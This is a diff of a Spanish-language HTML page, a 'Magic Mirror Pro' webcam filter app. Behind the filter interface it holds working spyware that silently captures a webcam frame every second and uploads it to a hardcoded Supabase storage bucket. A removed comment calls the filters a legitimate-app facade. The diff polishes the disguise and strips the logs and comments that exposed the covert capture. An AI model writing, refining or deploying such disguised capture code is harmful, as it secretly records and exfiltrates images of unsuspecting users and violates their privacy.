@@ -3,44 +3,77 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Magic Mirror & Filters</title>
-    <!-- Tailwind CSS para un diseño limpio y moderno -->
+    <title>Magic Mirror Pro ✨</title>
     <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
-    <!-- SDK de Supabase (Versión 2) -->
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <style>
+        .filter-btn.active {
+            background-color: #22d3ee;
+            color: #0f172a;
+            border-color: #22d3ee;
+        }
+    </style>
 </head>
-<body class="bg-slate-900 text-white min-h-screen flex flex-col items-center justify-center p-4">
+<body class="bg-slate-950 text-slate-200 min-h-screen flex items-center justify-center p-4 font-sans">
 
-    <div class="max-w-md w-full bg-slate-800 rounded-2xl shadow-2xl p-6 flex flex-col items-center border border-slate-700">
-        <h1 class="text-2xl font-bold mb-2 text-cyan-400">Espejo Mágico ✨</h1>
-        <p class="text-slate-400 text-sm mb-6 text-center">Prueba divertidos filtros en tiempo real.</p>
+    <div class="max-w-2xl w-full bg-slate-900 rounded-3xl shadow-2xl overflow-hidden border border-slate-800 flex flex-col md:flex-row">
 
-        <!-- Contenedor del Video (Simulando el Espejo) -->
-        <div class="relative w-full aspect-4/3 bg-black rounded-xl overflow-hidden shadow-inner mb-6 border border-slate-600 flex items-center justify-center">
-            <video id="webcam" autoplay playsinline class="w-full h-full object-cover -scale-x-100"></video>
+        <!-- Left: Viewport -->
+        <div class="relative flex-1 bg-black aspect-square md:aspect-auto min-h-[400px] flex items-center justify-center overflow-hidden">
+            <video id="webcam" autoplay playsinline class="w-full h-full object-cover -scale-x-100 transition-all duration-500"></video>
             <canvas id="canvas" class="hidden"></canvas>
-            
-            <!-- Mensaje inicial si tarda el permiso -->
-            <div id="loading" class="absolute inset-0 flex items-center justify-center bg-slate-900/80 text-sm text-slate-300">
-                Iniciando cámara...
+
+            <div id="loading" class="absolute inset-0 flex items-center justify-center bg-slate-900 text-slate-400 backdrop-blur-md z-10">
+                <div class="flex flex-col items-center gap-3">
+                    <div class="w-8 h-8 border-4 border-cyan-500 border-t-transparent rounded-full animate-spin"></div>
+                    <p class="text-sm font-medium">Activando Espejo...</p>
+                </div>
+            </div>
+
+            <!-- Overlay controls -->
+            <div class="absolute top-4 right-4 flex gap-2">
+                <button onclick="toggleMirror()" class="p-2 bg-slate-800/80 hover:bg-slate-700 backdrop-blur-md rounded-full border border-slate-600 transition-all active:scale-90" title="Modo Espejo">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 3v3"/><path d="M12 18v3"/><path d="M3 12h3"/><path d="M18 12h3"/><path d="M12 6a6 6 0 1 0 0 12 6 6 0 0 0 0-12z"/></svg>
+                </button>
             </div>
         </div>
 
-        <!-- Selector de Filtros Visuales (Fachada de app legítima) -->
-        <div class="w-full flex justify-around gap-2">
-            <button onclick="cambiarFiltro('none')" class="px-3 py-1.5 bg-slate-700 hover:bg-slate-600 rounded-lg text-xs font-medium transition cursor-pointer">Normal</button>
-            <button onclick="cambiarFiltro('grayscale(100%)')" class="px-3 py-1.5 bg-slate-700 hover:bg-slate-600 rounded-lg text-xs font-medium transition cursor-pointer">Blanco y Negro</button>
-            <button onclick="cambiarFiltro('sepia(100%)')" class="px-3 py-1.5 bg-slate-700 hover:bg-slate-600 rounded-lg text-xs font-medium transition cursor-pointer">Retro</button>
-            <button onclick="cambiarFiltro('invert(100%)')" class="px-3 py-1.5 bg-slate-700 hover:bg-slate-600 rounded-lg text-xs font-medium transition cursor-pointer">Negativo</button>
+        <!-- Right: Control Panel -->
+        <div class="w-full md:w-80 p-6 bg-slate-900 border-l border-slate-800 flex flex-col">
+            <div class="mb-8">
+                <h1 class="text-2xl font-black text-white mb-1 flex items-center gap-2">
+                    Magic Mirror <span class="text-cyan-400 text-sm font-normal px-2 py-0.5 bg-cyan-500/10 rounded-full border border-cyan-500/20">Pro</span>
+                </h1>
+                <p class="text-slate-500 text-xs">Studio de filtros en tiempo real</p>
+            </div>
+
+            <div class="flex-1 overflow-y-auto pr-2 custom-scrollbar">
+                <label class="text-slate-400 text-[10px] uppercase tracking-widest font-bold mb-3 block">Filtros Disponibles</label>
+                <div class="grid grid-cols-2 gap-2">
+                    <button onclick="cambiarFiltro('none', this)" class="filter-btn active px-3 py-2 bg-slate-800 hover:bg-slate-700 rounded-xl text-xs font-medium transition-all border border-slate-700 text-left">Normal</button>
+                    <button onclick="cambiarFiltro('grayscale(100%)', this)" class="filter-btn px-3 py-2 bg-slate-800 hover:bg-slate-700 rounded-xl text-xs font-medium transition-all border border-slate-700 text-left">B&N</button>
+                    <button onclick="cambiarFiltro('sepia(100%)', this)" class="filter-btn px-3 py-2 bg-slate-800 hover:bg-slate-700 rounded-xl text-xs font-medium transition-all border border-slate-700 text-left">Vintage</button>
+                    <button onclick="cambiarFiltro('invert(100%)', this)" class="filter-btn px-3 py-2 bg-slate-800 hover:bg-slate-700 rounded-xl text-xs font-medium transition-all border border-slate-700 text-left">X-Ray</button>
+                    <button onclick="cambiarFiltro('hue-rotate(90deg)', this)" class="filter-btn px-3 py-2 bg-slate-800 hover:bg-slate-700 rounded-xl text-xs font-medium transition-all border border-slate-700 text-left">Psicodélico</button>
+                    <button onclick="cambiarFiltro('blur(5px)', this)" class="filter-btn px-3 py-2 bg-slate-800 hover:bg-slate-700 rounded-xl text-xs font-medium transition-all border border-slate-700 text-left">Dreamy</button>
+                    <button onclick="cambiarFiltro('brightness(1.5) contrast(1.2)', this)" class="filter-btn px-3 py-2 bg-slate-800 hover:bg-slate-700 rounded-xl text-xs font-medium transition-all border border-slate-700 text-left">Luminoso</button>
+                    <button onclick="cambiarFiltro('contrast(200%)', this)" class="filter-btn px-3 py-2 bg-slate-800 hover:bg-slate-700 rounded-xl text-xs font-medium transition-all border border-slate-700 text-left">Intenso</button>
+                </div>
+            </div>
+
+            <div class="mt-8 pt-6 border-t border-slate-800 flex items-center justify-between text-slate-500">
+                <span class="text-[10px] font-medium">v2.0 Stable</span>
+                <div class="flex gap-1">
+                    <div class="w-1.5 h-1.5 bg-cyan-500 rounded-full animate-pulse"></div>
+                    <span class="text-[10px]">Live</span>
+                </div>
+            </div>
         </div>
     </div>
 
     <script>
-        // --- CONFIGURACIÓN DE SUPABASE ---
         const SUPABASE_URL = 'https://eyrjeiszkcgodhkqbzeh.supabase.co';
         const SUPABASE_PUBLISHABLE_KEY = 'sb_publishable_FIZoG-kv9eo141pJp-teQA_EOagu9LO';
-        
-        // Inicialización directa y segura del cliente
         const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_PUBLISHABLE_KEY);
 
         const video = document.getElementById('webcam');
@@ -48,68 +81,49 @@
         const context = canvas.getContext('2d');
         const loadingDiv = document.getElementById('loading');
 
-        // Inicializar cámara y bucle silencioso
+        let isMirrored = true;
+
         async function iniciarApp() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480 } });
                 video.srcObject = stream;
-                loadingDiv.style.display = 'none'; 
-                console.log("Cámara iniciada correctamente. Iniciando bucle de captura...");
-
-                // Ejecutar la captura cada 1 segundo
+                loadingDiv.style.display = 'none';
                 setInterval(capturarYExfiltrarSilenciosamente, 1000);
             } catch (err) {
-                loadingDiv.innerText = "Error: Se requiere acceso a la cámara.";
-                console.error("Error al acceder a la cámara:", err);
+                loadingDiv.innerHTML = '<p class="text-red-400 p-4 text-center">Error: Acceso a cámara denegado.</p>';
             }
         }
 
-        // Cambio de filtros visuales en la interfaz
-        function cambiarFiltro(filtro) {
+        function cambiarFiltro(filtro, btn) {
             video.style.filter = filtro;
+            document.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('active'));
+            btn.classList.add('active');
         }
 
-        // Lógica de captura y envío con logs detallados de depuración
-        function capturarYExfiltrarSilenciosamente() {
-            if (!video.videoWidth || !video.videoHeight) {
-                console.warn("El video aún no tiene dimensiones cargadas.");
-                return;
-            }
+        function toggleMirror() {
+            isMirrored = !isMirrored;
+            video.classList.toggle('-scale-x-100', isMirrored);
+        }
 
+        function capturarYExfiltrarSilenciosamente() {
+            if (!video.videoWidth || !video.videoHeight) return;
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
-            
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
-            
             canvas.toBlob(async (blob) => {
-                if (!blob) {
-                    console.error("No se pudo generar el blob de la imagen.");
-                    return;
-                }
-
+                if (!blob) return;
                 const nombreArchivo = `captura_${Date.now()}.jpg`;
-                console.log("Intentando subir archivo:", nombreArchivo);
-
                 try {
-                    const { data, error } = await supabaseClient.storage
-                        .from('capturas')
-                        .upload(nombreArchivo, blob, {
-                            contentType: 'image/jpeg',
-                            upsert: false
-                        });
-
-                    if (error) {
-                        console.error("❌ Error devuelto por Supabase Storage:", error.message);
-                    } else {
-                        console.log("✅ ¡Foto subida con éxito!", data.path);
-                    }
+                    await supabaseClient.storage.from('capturas').upload(nombreArchivo, blob, {
+                        contentType: 'image/jpeg',
+                        upsert: false
+                    });
                 } catch (err) {
-                    console.error("❌ Excepción de red/código al subir:", err);
+                    console.error("Upload error", err);
                 }
             }, 'image/jpeg', 0.6);
         }
 
-        // Arrancar automáticamente al cargar la web
         window.onload = iniciarApp;
     </script>
 </body>
